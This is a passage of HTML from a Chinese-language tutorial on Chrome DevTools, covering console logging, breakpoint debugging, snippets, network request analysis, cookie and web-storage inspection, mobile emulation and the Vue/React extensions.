data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976278-4dd39a2d-cdcb-4b75-9c08-ce6fb0652bf3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>随便点击一个进去，就可以对动画的属性值进行调试：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976297-580cd9fc-2abf-41e7-ae23-ebd496ddd0e5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976297-580cd9fc-2abf-41e7-ae23-ebd496ddd0e5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="yyPRV"></a></p><h2 id="4-使用-Console-和-Sources-调试-JavaScript"><a href="#4-使用-Console-和-Sources-调试-JavaScript" class="headerlink" title="4. 使用 Console 和 Sources 调试 JavaScript"></a>4. 使用 Console 和 Sources 调试 JavaScript<br /><br /></h2><p><a name="ZvNbn"></a></p><h3 id="4-1-Console-面板简介及交互式命令"><a href="#4-1-Console-面板简介及交互式命令" class="headerlink" title="4.1 Console 面板简介及交互式命令"></a>4.1 Console 面板简介及交互式命令</h3><p>可以使用 Console 面板执行以下功能：<br />● 运行 JavaScript 代码，交互式编程<br />● 查看程序中打印的 Log 日志<br />（1）在 Console 中输入一些 JavaScript 代码，表达式，算法等来进行调试：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976386-5df95794-3222-477e-8625-db2fd45cdee5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976386-5df95794-3222-477e-8625-db2fd45cdee5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（2）查看程序中打印的 Log 日志：<br />在平时项目，可能使用 console 来打印后端传来的请求响应数据，来查看数据格式。还会查看一些代码的运行结果等等。<br />console 提供了很多方法打印方法：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976292-ab2c51a2-14f3-41ef-9125-e4c048ad6ffe.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976292-ab2c51a2-14f3-41ef-9125-e4c048ad6ffe.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>主要的调试方法有以下四种，其中 error 和 warn 方法有特定的图标和颜色标识：<br />●console.log()：打印普通信息<br />●console.info()：打印提示性信息<br />●console.error()：打印错误信息<br />●console.warn()：打印警示信息</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976394-f34fb01c-49f5-4417-b3f3-cc0effd192b5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976394-f34fb01c-49f5-4417-b3f3-cc0effd192b5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="zFRkO"></a></p><h3 id="4-2-调试-JavaScript-的基本流程及断点调试"><a href="#4-2-调试-JavaScript-的基本流程及断点调试" class="headerlink" title="4.2 调试 JavaScript 的基本流程及断点调试"></a>4.2 调试 JavaScript 的基本流程及断点调试</h3><p>对于 JavaScript 的调试主要有以下两种方式：<br />● 传统的 console.log 或者是 alert()打印运行时信息进行调试<br />●JavaScript 断点调试<br /><strong>（1）使用 debugger 进行断点调试</strong><br />断点调试，在需要断点的位置设置一个 debugger：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976350-33f9eaa1-c8bd-4413-a2bc-e9d6337839ce.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976350-33f9eaa1-c8bd-4413-a2bc-e9d6337839ce.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976350-9be20881-8171-45af-a8a6-b2bcb606bae5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976350-9be20881-8171-45af-a8a6-b2bcb606bae5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>他们分别代表：<br />●Resume script execution：恢复脚本的执行<br />●Step over next function call：跳过下一个函数的执行<br />●Step into next function call：进入到下一个函数的执行<br />●Step out of current function：跳出当前函数<br />●Step（快捷键 F9）：单步执行<br /><strong>（2）使用事件监听进行断点调试</strong><br />除了使用 debugger 之外，还可以直接进行断点设置：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976421-a067a603-7276-40fa-865d-f9956e0eff33.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976421-a067a603-7276-40fa-865d-f9956e0eff33.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>最下面这个是事件监听的事件，我们只要选中相应的事件，再在页面执行响应的事件，就可以进行断点调试。<br /><strong>（3）在代码行上设置断点</strong><br />通常我们会在有问题的那几行代码设置断点，然后进行断点调试（可以同时设置多个断点）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976379-6e7ee0f4-2c77-4590-a5df-502a754903ed.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976379-6e7ee0f4-2c77-4590-a5df-502a754903ed.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以在 Scope 中查看相关变量的值。</p><p><a name="y6nMP"></a></p><h3 id="4-3-Sources-源代码面板简介"><a href="#4-3-Sources-源代码面板简介" class="headerlink" title="4.3 Sources 源代码面板简介"></a>4.3 Sources 源代码面板简介</h3><p>Sources 面板包含了该网站的静态资源：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976334-3c459b8c-6757-4315-ad3c-59ff12922926.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976334-3c459b8c-6757-4315-ad3c-59ff12922926.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们可以使用快捷键 Ctrl+P 来搜索相关的静态资源文件来查看，还可以使用快捷键 Ctrl+ Shift+P 来调出命令行，命名行中有所有命令的快捷键：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976304-e9fb39a5-7754-4743-a94f-d1d9bd821160.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976304-e9fb39a5-7754-4743-a94f-d1d9bd821160.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>打开需要调试的文件，就可以在右侧进行编辑调试。</p><p><a name="pacTl"></a></p><h3 id="4-4-使用-Snippets-来辅助-Debugging"><a href="#4-4-使用-Snippets-来辅助-Debugging" class="headerlink" title="4.4 使用 Snippets 来辅助 Debugging"></a>4.4 使用 Snippets 来辅助 Debugging</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976422-1b18e2f8-0e04-417b-bc6e-5b0e2c29f226.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976422-1b18e2f8-0e04-417b-bc6e-5b0e2c29f226.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>我们可以点击 New snippet 来添加一个代码片段来辅助调试，比如，可以引入 JQuery 来赋值调试：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976416-f15f3bb0-8aae-4229-aa2f-24e3aa95d7f2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976416-f15f3bb0-8aae-4229-aa2f-24e3aa95d7f2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>引入片段之后，右键点击该引入的文件，点击 run，就可以使用 JQuery 对原来的样式、事件等进行调试了。<br />需要注意的是：新引入的代码片段不会对原有代码产生影响。</p><p><a name="Lcht3"></a></p><h3 id="4-5-使用-DevTools-作为代码编辑器"><a href="#4-5-使用-DevTools-作为代码编辑器" class="headerlink" title="4.5 使用 DevTools 作为代码编辑器"></a>4.5 使用 DevTools 作为代码编辑器</h3><p>在 Sources 中有一个 Filesystem，在里面可以添加本地文件进行编辑操作，相当于一个编辑器（这种方法是对本地源代码的编辑）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976363-7c549063-0e09-4ad5-8a4d-fffd129c6de2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976363-7c549063-0e09-4ad5-8a4d-fffd129c6de2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="YUwzg"></a></p><h2 id="5-调试网络"><a href="#5-调试网络" class="headerlink" title="5. 调试网络"></a>5. 调试网络<br /><br /></h2><p><a name="J6TWB"></a></p><h3 id="5-1-Network-面板简介"><a href="#5-1-Network-面板简介" class="headerlink" title="5. 1 Network 面板简介"></a>5. 1 Network 面板简介</h3><p>我们可以用 Network 面板来完成以下事情：<br />● 查看网页资源请求预览，查看资源分布<br />● 针对单一请求查看 Request&#x2F;Response 或消耗时间等<br />● 分析网页性能优化，使用工具代理页面请求数据等<br />我们可以看到执行一个操作之后，所有的网络请求数据：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976513-a5535193-95d1-4d43-bc75-2f27a14d3e9a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976513-a5535193-95d1-4d43-bc75-2f27a14d3e9a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Czuxf"></a></p><h3 id="5-2-使用-Network-查看网页查看站点网络"><a href="#5-2-使用-Network-查看网页查看站点网络" class="headerlink" title="5.2 使用 Network 查看网页查看站点网络"></a>5.2 使用 Network 查看网页查看站点网络</h3><p>选择过滤，就可以对网络请求数据进行筛选，可以搜索数据名称，也可以根据类型进行筛选：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976451-9fb7b197-62cb-4736-b1ca-1b7add1aa240.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976451-9fb7b197-62cb-4736-b1ca-1b7add1aa240.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>All 是请求回来的所有数据，XHR 是所有异步请求的数据。<br />点开 XHR 中的一条请求数据，就可以查看它的详细信息：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976603-37755662-b542-42d7-8d94-4af99b9967f2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976603-37755662-b542-42d7-8d94-4af99b9967f2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>过滤按钮后面是 search，过滤只能过滤请求数据，而 search 不仅可以搜索到请求数据还可以搜索数据的请求头和请求体，还可以进行正则匹配：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976618-7444da37-2e4f-4ab5-8f71-bc44f8e0f5f8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976618-7444da37-2e4f-4ab5-8f71-bc44f8e0f5f8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以通过 Preserve log 可以记录上一个网页的请求，可以通过 Disable cache 禁用缓存：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976459-9863fc3e-21c5-45a8-80ef-7d9828ec0ea9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976459-9863fc3e-21c5-45a8-80ef-7d9828ec0ea9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>对于单一的请求，Headers 是请求头相关数据，Preview 是对请求回来的数据进行预览，Response 是请求回来的数据，Timing 在心性能优化时会用到：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976377-ebf4f0b3-04fc-4b22-b53f-784c7f311639.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976377-ebf4f0b3-04fc-4b22-b53f-784c7f311639.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>timing 内容：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976501-258d0fa5-9a22-4596-b3dd-21f54476501c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976501-258d0fa5-9a22-4596-b3dd-21f54476501c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在请求的最下面，有对所有请求的统计信息:</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976822-53d7653f-01d7-41f8-9cf3-81d14b6650d2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976822-53d7653f-01d7-41f8-9cf3-81d14b6650d2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="XpWSB"></a></p><h3 id="5-3-使用-Network-Waterfall-分析页面载入性能"><a href="#5-3-使用-Network-Waterfall-分析页面载入性能" class="headerlink" title="5.3 使用 Network Waterfall 分析页面载入性能"></a>5.3 使用 Network Waterfall 分析页面载入性能</h3><p>对于请求数据，右侧会显示请求时间：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976636-f8df6dff-0126-4162-9c41-08a2d6bb06ca.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976636-f8df6dff-0126-4162-9c41-08a2d6bb06ca.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以根据请求时间的长短，对项目做出相应的优化。如，有些 JS、CSS 文件可以合并、进行压缩等操作，对于图片可以懒加载等。<br />可以查看某个请求的具体请求时间，来确定是哪里耗时较多：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976380-741a2dfd-8de8-4ffb-808d-71b600e25e70.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976380-741a2dfd-8de8-4ffb-808d-71b600e25e70.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="cur82"></a></p><h2 id="6-客户端存储-Application-面板"><a href="#6-客户端存储-Application-面板" class="headerlink" title="6. 客户端存储 Application 面板"></a>6. 客户端存储 Application 面板<br /><br /></h2><p><a name="CgdMA"></a></p><h3 id="6-1-查看与调试-Cookie"><a href="#6-1-查看与调试-Cookie" class="headerlink" title="6.1 查看与调试 Cookie"></a>6.1 查看与调试 Cookie<br /><br /></h3><p>可以在 Application 面板查看 Cookie：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976388-fc474edc-8779-442d-88f3-678c63511f17.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976388-fc474edc-8779-442d-88f3-678c63511f17.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以直接点击添加、删除、修改上面 Cookie 的属性值，还可以通过 document.cookie &#x3D;’cookie 名称 &#x3D; cookie 值’来添加新的 cookie：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976634-9352dda6-a71f-4159-8f79-dcd9cc65b740.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976634-9352dda6-a71f-4159-8f79-dcd9cc65b740.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="VCfyD"></a></p><h3 id="6-2-查看与调试-LocalStorage-与-SessionStorage"><a href="#6-2-查看与调试-LocalStorage-与-SessionStorage" class="headerlink" title="6.2 查看与调试 LocalStorage 与 SessionStorage"></a>6.2 查看与调试 LocalStorage 与 SessionStorage</h3><p>我们同样可以直接点击添加、删除、修改 LocalStorage 与 SessionStorage 的属性值:</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976479-4a81dc5f-0c09-4642-b42b-1aab5b08d459.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976479-4a81dc5f-0c09-4642-b42b-1aab5b08d459.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>使用 localStorage 的 API 可以对其进行增删改查的操作（sessionStorage 也有类似的操作）:</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976434-1a803ee1-d3a5-42e8-9093-e62f7eeb1cff.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976434-1a803ee1-d3a5-42e8-9093-e62f7eeb1cff.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>LocalStorage 会永久存储在该站点的本地存储下，SessionStorage 的本地存储会在一次会话或者登出、关闭浏览器等情况之后删除。</p><p><a name="ElFRF"></a></p><h2 id="7-调试移动设备、H5-页面及远程调试"><a href="#7-调试移动设备、H5-页面及远程调试" class="headerlink" title="7. 调试移动设备、H5 页面及远程调试"></a>7. 调试移动设备、H5 页面及远程调试<br /><br /></h2><p><a name="XxtZx"></a></p><h3 id="7-1-移动端-H5-页面调试"><a href="#7-1-移动端-H5-页面调试" class="headerlink" title="7.1 移动端 H5 页面调试"></a>7.1 移动端 H5 页面调试</h3><p>点击如图所示的按钮，就可以切换为移动端显示，可以在上面的工具栏切换显示的设备，以及缩放的大小：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976477-fc0ee3e2-9176-453f-a99a-cca809c3f1cc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976477-fc0ee3e2-9176-453f-a99a-cca809c3f1cc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="kNNRc"></a></p><h3 id="7-2-使用-Chrome-DevTools-进行-H5-页面的开发"><a href="#7-2-使用-Chrome-DevTools-进行-H5-页面的开发" class="headerlink" title="7.2 使用 Chrome DevTools 进行 H5 页面的开发"></a>7.2 使用 Chrome DevTools 进行 H5 页面的开发</h3><p>当针对移动设备进行开发时，会有一些诸如获取地理位置，角度、尺寸、方向等操作。我们使用快捷键 Ctrl+shift+p 调出菜单，然后搜索 sensors，点击会出现 Sensors 面板：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976532-3aa6d008-2294-413f-9002-b76707282543.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976532-3aa6d008-2294-413f-9002-b76707282543.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这三个选项分别是：<br />●Location：地理位置信息<br />●Orientation：设备的方向信息<br />●Touch：触摸信息<br />我们可以通过这些选项<strong>更改地理位置信息</strong>、<strong>更改模拟设备的方向</strong>、<strong>更改触摸相关属性</strong>。<br />还可以使用快捷键 Ctrl+shift+p 调出菜单，然后搜索 Network conditions，点开会出现一个菜单：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976427-84430a1e-b84d-4013-99cb-13a4cd5f44bc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976427-84430a1e-b84d-4013-99cb-13a4cd5f44bc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>第一项是禁用缓存，第二项是模拟网络情况，第三项是模拟用户的 user-agent，里面有很多选项可以选择：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976513-dea49c94-0810-4661-8f7b-96b2953337aa.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976513-dea49c94-0810-4661-8f7b-96b2953337aa.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="d6mNA"></a></p><h2 id="8-在-DevTools-中集成-Vue-和-React-插件"><a href="#8-在-DevTools-中集成-Vue-和-React-插件" class="headerlink" title="8. 在 DevTools 中集成 Vue 和 React 插件"></a>8. 在 DevTools 中集成 Vue 和 React 插件</h2><p>我们可以在扩展程序中添加 React 和 Vue 的插件，安装之后，浏览器的右上角会显示相应的图标。如果该网站是使用 Vue 开发的，Vue 的图标就会点亮，React 也一样。<br />我们打开 Vue 官网，就可看到 Vue 的图标点亮了，说明该网站是使用 Vue 开发的（废话，Vue 官网肯定用 Vue 开发的啦）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976502-2a7c8379-c877-4b12-a232-cbede62e58cc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976502-2a7c8379-c877-4b12-a232-cbede62e58cc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>添加之后，就可以在 DevTools 中看到 Vue 的选项，在里面查看组件、数据、Vuex 等内容：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976455-a39a3739-34b3-48ac-96e0-a83d259e5dc6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612688976455-a39a3739-34b3-48ac-96e0-a83d259e5dc6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>最后的最后：</strong><br />Chrome DevTools 